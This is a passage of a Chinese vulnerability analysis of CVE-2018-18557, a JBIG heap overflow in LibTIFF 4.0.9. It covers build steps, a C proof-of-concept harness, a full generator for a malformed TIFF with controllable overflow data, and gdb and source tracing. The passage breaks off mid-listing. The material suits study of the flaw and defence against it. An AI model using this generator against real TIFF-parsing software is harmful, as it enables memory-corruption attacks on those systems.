<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="ebf93dabe741d305bdac7f5d24c073d8">前言</h1>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18557" target="_blank">cve描述</a>：</p>
<blockquote>
<p>LibTIFF 4.0.9 (with JBIG enabled) decodes arbitrarily-sized JBIG into a buffer, ignoring the buffer size, which leads to a tif_jbig.c JBIGDecode out-of-bounds write.</p>
</blockquote>
<p>该cve发生在LibTIFF 4.0.9版本中，由于在解码JBIG的时候没有对size 进行验证，在JBIGDecode函数中会造成大量数据的堆溢出</p>
<h1 data-content="1" id="a8958844a553d59ab289783f22369fd1">编译安装</h1>
<p>为了复现该漏洞，需要使得LibTIFF 支持jbig解码功能，所以需要先安装libjbig-dev</p>
<p><code>sudo apt-get install libjbig-dev</code></p>
<p>然后编译安装LibTIFF 4.0.9，<a href="https://www.exploit-db.com/apps/54bad211279cc93eb4fca31ba9bfdc79-tiff-4.0.9.tar.gz" target="_blank">链接在此</a></p>
<p><code>./configure --prefix=/xxxx/xxx/build</code></p>
<p><code>make &amp;&amp; make install</code></p>
<h1 data-content="1" id="1f42d5bffe99dd53be27b88f42327ead">tiff文件格式</h1>
<p>TIFF是Tagged Image File Format的缩写 ， 标签图像文件格式</p>
<p>TIFF与其他文件格式最大的不同在于除了图像数据，它还可以记录很多图像的其他信息。它记录图像数据的方式也比较灵活， 理论上来说， 任何其他的图像格式都能为TIFF所用， 嵌入到TIFF里面。比如JPEG， Lossless JPEG， JPEG2000和任意数据宽度的原始无压缩数据都可以方便的嵌入到TIFF中去。由于它的可扩展性， TIFF在数字影响、遥感、医学等领域中得到了广泛的应用。TIFF文件的后缀是.tif或者.tiff</p>
<p>Tiff的结构大概是这样的组成：</p>
<p>文件头信息区（IFH）、图像文件目录（IFD）和图像数据区</p>
<p>而IFD又包含了很多DE（ Directory Entry ）</p>
<p>简单的说，IFD用于存储描述图像的属性信息，如图像的 长、宽、分辨率等 ，DE就是一个个不同属性描述。而图像数据区则直接存储像素信息的二进制数据</p>
<p>这里只做简单介绍，详细可见： <a href="https://www.jianshu.com/p/ff32eb09ed3d" target="_blank">https://www.jianshu.com/p/ff32eb09ed3d</a></p>
<p>可以下载他的tiff例子，载入010editor中跟着看，对了解tiff非常有帮助</p>
<h1 data-content="1" id="e1a6a33f3e6160a8f0b04e5697db83be">触发漏洞</h1>
<p>参考了一波 <a href="https://www.exploit-db.com/exploits/45694" target="_blank">https://www.exploit-db.com/exploits/45694</a></p>
<p>但发现这上面所谓的poc，只能说是一个用于生成触发漏洞tiff文件的代码而已，那具体怎么使用libtiff的代码才能触发漏洞，这还得俺自己动手写</p>
<p>通过调试+源码查看，分析函数调用，真正的poc如下</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">"tiffio.h"</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"usage: %s &lt;tif file&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">TIFF</span><span class="o">*</span> <span class="n">tif</span> <span class="o">=</span> <span class="n">TIFFOpen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"r"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">tif</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">tdata_t</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">tstrip_t</span> <span class="n">strip</span><span class="p">;</span>

    <span class="n">buf</span> <span class="o">=</span> <span class="n">_TIFFmalloc</span><span class="p">(</span><span class="n">TIFFStripSize</span><span class="p">(</span><span class="n">tif</span><span class="p">));</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">strip</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">strip</span> <span class="o">&lt;</span> <span class="n">TIFFNumberOfStrips</span><span class="p">(</span><span class="n">tif</span><span class="p">);</span> <span class="n">strip</span><span class="o">++</span><span class="p">)</span>
        <span class="n">TIFFReadEncodedStrip</span><span class="p">(</span><span class="n">tif</span><span class="p">,</span> <span class="n">strip</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="p">(</span><span class="n">tsize_t</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"it will crash,because heap space has been overflow:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">_TIFFfree</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span><span class="c1">//&lt;&lt;&lt; crash!</span>

    <span class="n">TIFFClose</span><span class="p">(</span><span class="n">tif</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">//gcc ./poc.c -g -o poc -I ./build/include/ -L ./build/lib/ ./build/lib/libtiff.a -ljbig -lm -lz</span>
</pre></div>
<p>编译poc：</p>
<p><code>gcc ./poc.c -g -o poc -I ./build/include/ -L ./build/lib/ ./build/lib/libtiff.a -ljbig -lm -lz</code></p>
<p>这里 使用局部静态链接，只静态链接libtiff，而对其他库如libjbig、libmath、zlibc等使用动态链接，这是为了在调试的时候能直接源码级调试</p>
<p>然后编译exp-db的“testcase_generator.c”</p>
<p><code>gcc testcase_generator.c -g -o testcase_generator -ljbig</code></p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">"jbig.h"</span><span class="cp"></span>


<span class="kt">void</span> <span class="nf">output_bie</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">start</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">fwrite</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">file</span><span class="p">);</span>

  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">FILE</span><span class="o">*</span> <span class="n">inputfile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"rb"</span><span class="p">);</span>
  <span class="kt">FILE</span><span class="o">*</span> <span class="n">outputfile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="s">"wb"</span><span class="p">);</span>

  <span class="c1">// Write the hacky TIF header.</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="c1">// Identifier.</span>
    <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// Version.</span>
    <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// First IFD offset.</span>
    <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span>
    <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span>
    <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span>
    <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span>
    <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
    <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
    <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
    <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span>
  <span class="p">};</span>
  <span class="n">fwrite</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">outputfile</span><span class="p">);</span>

  <span class="c1">// Read the inputfile.</span>
  <span class="k">struct</span> <span class="n">stat</span> <span class="n">st</span><span class="p">;</span>
  <span class="n">stat</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">);</span>
  <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
  <span class="n">fread</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">inputfile</span><span class="p">);</span>

  <span class="c1">// Calculate how many "pixels" we have in the input.</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">bitmaps</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="n">data</span> <span class="p">};</span>
  <span class="k">struct</span> <span class="n">jbg_enc_state</span> <span class="n">se</span><span class="p">;</span>

  <span class="n">jbg_enc_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">se</span><span class="p">,</span> <span class="n">size</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">bitmaps</span><span class="p">,</span> <span class="n">output_bie</span><span class="p">,</span> <span class="n">outputfile</span><span class="p">);</span>
  <span class="n">jbg_enc_out</span><span class="p">(</span><span class="o">&amp;</span><span class="n">se</span><span class="p">);</span>
  <span class="n">jbg_enc_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">se</span><span class="p">);</span>

  <span class="c1">// The raw JBIG data has been written, now write the IFDs for the TIF file.</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">ifds</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// Number of entries.     +0</span>

    <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// Subfile type.          +2</span>
    <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// Datatype: LONG.        +6</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 1 element. +10</span>
    <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 0          +14</span>
    <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="c1">// IMAGE_WIDTH            +16</span>
    <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// Datatype: SHORT.       +18</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 1 element. +22</span>
    <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 96 hex width.  +26</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="c1">// IMAGE_LENGTH           +28</span>
    <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// SHORT                  +30</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 1 element  +34</span>
    <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 96 hex length. +38</span>
    <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="c1">// BITS_PER_SAMPLE        +40</span>
    <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// SHORT                  +42</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 1 element  +46</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 1          +50</span>
    <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="c1">// COMPRESSION            +52</span>
    <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// SHORT                  +54</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 1 element  +58</span>
    <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// JBIG       +62</span>
    <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="c1">// PHOTOMETRIC            +64</span>
    <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// SHORT                  +66</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 1 element  +70</span>
    <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>          <span class="c1">// / +74</span>
    <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="c1">// STRIP_OFFSETS          +78</span>
    <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// LONG                   +80</span>
    <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 0x13 elements  +82</span>
    <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// Offset 2C in file  +86</span>
    <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="c1">// SAMPLES_PER_PIXEL      +90</span>
    <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// SHORT                  +92</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 1 element  +94</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 1          +98</span>
    <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="c1">// ROWS_PER_STRIP         +102</span>
    <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// LONG                   +104</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 1 element  +106</span>
    <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="c1">// Invalid    +110</span>
    <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="c1">// STRIP_BYTE_COUNTS      +114</span>
    <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// LONG                   +116</span>
    <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 0x13 elements  +118</span>
    <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// Read 0xC0C5 bytes for the strip? +122</span>
    <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="c1">// X_RESOLUTION</span>
    <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// RATIONAL</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 1 element</span>
    <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
    <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="c1">// Y_RESOLUTION</span>
    <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// RATIONAL</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 1 Element</span>
    <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
    <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="c1">// RESOLUTION_UNIT</span>
    <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// SHORT</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 1 Element</span>
    <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 2</span>
    <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="c1">// FILL_ORDER</span>
    <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// SHORT</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// 1 Element</span>
    <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="c1">// Bit order inverted.</span>
    <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span> <span class="p">};</span>

  <span class="c1">// Adjust the offset for the IFDs.</span>
  <span class="kt">uint32_t</span> <span class="n">ifd_offset</span> <span class="o">=</span> <span class="n">ftell</span><span class="p">(</span><span class="n">outputfile</span><span class="p">);</span>
  <span class="n">fwrite</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">ifds</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ifds</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">outputfile</span><span class="p">);</span>
  <span class="n">fseek</span><span class="p">(</span><span class="n">outputfile</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
  <span class="n">fwrite</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ifd_offset</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ifd_offset</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">outputfile</span><span class="p">);</span>

  <span class="c1">// Adjust the strip size properly.</span>
  <span class="n">fseek</span><span class="p">(</span><span class="n">outputfile</span><span class="p">,</span> <span class="n">ifd_offset</span> <span class="o">+</span> <span class="mi">118</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
  <span class="n">fwrite</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ifd_offset</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ifd_offset</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">outputfile</span><span class="p">);</span>

  <span class="n">fclose</span><span class="p">(</span><span class="n">outputfile</span><span class="p">);</span>
  <span class="n">fclose</span><span class="p">(</span><span class="n">inputfile</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>它主要的作用是生成一个可发生堆溢出的tiff文件，且溢出内容可以由我们控制，如创建一个文本文件text，其内容大量填充为aaaa...</p>
<p>执行<code>./testcase_generator text testcase.tif</code></p>
<p>这就会使得大量aaa数据通过JBIG压缩方式被写入testcase.tif文件中</p>
<p>接着执行poc：</p>
<p><code>./poc ./testcase.tif</code></p>
<p>成功触发漏洞：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200413144726-a3178194-7d52-1.png"/></p>
<p>这里报错是，free的时候发现该chunk的next size位异常，这种情况实际上是因为堆溢出太多数据，导致后续free的时候很多chunk被溢出篡改了数据，所以产生了这种报错</p>
<h1 data-content="1" id="1dea86f669cfce03324d7dba52c62245">漏洞分析</h1>
<h2 data-content="1" id="d05f567061cfe19dc9d31eeef0122247">gdb调试</h2>
<p>根据cve信息，我这里直接定位到 JBIGDecode函数，给他整个断点</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200413144739-aa9d4cfa-7d52-1.png"/></p>
<p>然后一步步nextcall</p>
<p>直到执行<code>_TIFFmemcpy</code>前</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200413144751-b2332228-7d52-1.png"/></p>
<p>可以看到这个第三个参数就尼玛离谱，完全没有任何检查，该长度就是之前的text文本文件中的字符数量，也就是字符a的个数</p>
<p>然后来康康这个堆空间0x657b60的大小，只有0xb30</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200413144807-bbce6202-7d52-1.png"/></p>
<p>而<code>_TIFFmemcpy</code>的length是0x26d0，巨大的堆溢出就是这么产生的</p>
<h2 data-content="1" id="7566284d17ea074b5ec2b4a89d795d38">源码分析</h2>
<p>从poc.c结合libtiff来康康完整的函数调用链：</p>
<p>首先是<code>TIFFReadEncodedStrip(tif, strip, buf, (tsize_t) -1);</code></p>
<p>在源码中，TIFFReadEncodedStrip会调用JBIGDecode函数</p>
<div class="highlight"><pre><span></span><span class="n">TIFFReadEncodedStrip</span><span class="p">(</span><span class="n">TIFF</span><span class="o">*</span> <span class="n">tif</span><span class="p">,</span> <span class="n">uint32</span> <span class="n">strip</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">buf</span><span class="p">,</span> <span class="n">tmsize_t</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">module</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"TIFFReadEncodedStrip"</span><span class="p">;</span>
    <span class="n">TIFFDirectory</span> <span class="o">*</span><span class="n">td</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_dir</span><span class="p">;</span>
    <span class="n">tmsize_t</span> <span class="n">stripsize</span><span class="p">;</span>
    <span class="n">uint16</span> <span class="n">plane</span><span class="p">;</span>

    <span class="n">stripsize</span><span class="o">=</span><span class="n">TIFFReadEncodedStripGetStripSize</span><span class="p">(</span><span class="n">tif</span><span class="p">,</span> <span class="n">strip</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">plane</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">stripsize</span><span class="o">==</span><span class="p">((</span><span class="n">tmsize_t</span><span class="p">)(</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span>
        <span class="k">return</span><span class="p">((</span><span class="n">tmsize_t</span><span class="p">)(</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>

    <span class="cm">/* shortcut to avoid an extra memcpy() */</span>
    <span class="k">if</span><span class="p">(</span> <span class="n">td</span><span class="o">-&gt;</span><span class="n">td_compression</span> <span class="o">==</span> <span class="n">COMPRESSION_NONE</span> <span class="o">&amp;&amp;</span>
        <span class="n">size</span><span class="o">!=</span><span class="p">(</span><span class="n">tmsize_t</span><span class="p">)(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">size</span> <span class="o">&gt;=</span> <span class="n">stripsize</span> <span class="o">&amp;&amp;</span>
        <span class="o">!</span><span class="n">isMapped</span><span class="p">(</span><span class="n">tif</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
        <span class="p">((</span><span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_flags</span><span class="o">&amp;</span><span class="n">TIFF_NOREADRAW</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">TIFFReadRawStrip1</span><span class="p">(</span><span class="n">tif</span><span class="p">,</span> <span class="n">strip</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">stripsize</span><span class="p">,</span> <span class="n">module</span><span class="p">)</span> <span class="o">!=</span> <span class="n">stripsize</span><span class="p">)</span>
            <span class="k">return</span> <span class="p">((</span><span class="n">tmsize_t</span><span class="p">)(</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">isFillOrder</span><span class="p">(</span><span class="n">tif</span><span class="p">,</span> <span class="n">td</span><span class="o">-&gt;</span><span class="n">td_fillorder</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
